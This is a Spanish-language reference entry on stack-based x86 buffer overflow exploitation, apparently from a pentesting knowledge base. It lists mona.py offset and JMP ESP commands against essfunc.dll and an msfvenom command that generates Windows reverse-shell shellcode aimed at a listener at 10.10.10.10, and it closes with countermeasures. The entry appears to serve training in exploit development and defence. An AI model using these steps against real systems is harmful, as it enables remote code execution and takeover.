# Explotación de Buffer Overflow (Stack-based x86)

## Descripción
La explotación de desbordamiento de búfer en la pila (stack) ocurre cuando una aplicación escribe más datos en un búfer de memoria de los que este puede contener, sobrescribiendo estructuras de control adyacentes como el puntero de instrucción (EIP/RIP). En sistemas x86, esto permite a un atacante redirigir el flujo de ejecución hacia código malicioso (shellcode) mediante la manipulación del registro EIP. Esta técnica es fundamental en el desarrollo de exploits para software legacy o servicios binarios mal programados.

## Clasificación
- **Fase**: Explotación
- **MITRE ATT&CK**: T1203 (Exploitation for Client Execution); T1211 (Exploitation for Privilege Escalation)
- **Plataforma**: Multi
- **Dificultad**: Avanzada

## Herramientas
- **Immunity Debugger** — depurador dinámico para Windows orientado al desarrollo de exploits.
- **mona.py** — script para Immunity Debugger que automatiza la búsqueda de gadgets y el cálculo de offsets.
- **msfvenom** (`-p windows/shell_reverse_tcp`, `-b '\x00'`) — generador de shellcode y payloads de Metasploit.
- **pwntools** — framework de Python para el desarrollo rápido de prototipos de exploits.

## Comandos / Ejemplos

### Configuración inicial de Mona.py
```bash
# Establecer el directorio de trabajo para mona.py en Immunity Debugger
!mona config -set workingfolder c:\logs\%p
```

### Identificación del offset exacto
```bash
# Crear un patrón cíclico de 1000 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
# Encontrar el offset después de que el EIP sea sobrescrito con una dirección del patrón
!mona findmsp -distance 1000
```

### Búsqueda de una instrucción JMP ESP
```bash
# Buscar una dirección de retorno que contenga JMP ESP omitiendo protecciones ASLR/DEP
!mona jmp -r esp -cpb "\x00\x0a\x0d"
# Resultado: dirección 0x625011AF en essfunc.dll
```

### Generación de Shellcode
```bash
# Generar shellcode evitando caracteres nulos y saltos de línea
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -b "\x00\x0a\x0d" -f python
```

## Contramedidas
- Implementar ASLR (Address Space Layout Randomization) para aleatorizar las direcciones de memoria.
- Habilitar DEP/NX (Data Execution Prevention) para marcar la pila como no ejecutable.
- Utilizar Stack Canaries (Stack Cookies) para detectar desbordamientos antes de la ejecución del retorno.
- Emplear lenguajes de programación seguros (Rust, Go) o funciones con control de límites (strncpy en lugar de strcpy).

## Referencias
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking* (5th ed.). McGraw-Hill Education.
- MITRE Corporation. (2024). ATT&CK Technique T1203: Exploitation for Client Execution. https://attack.mitre.org/techniques/T1203/
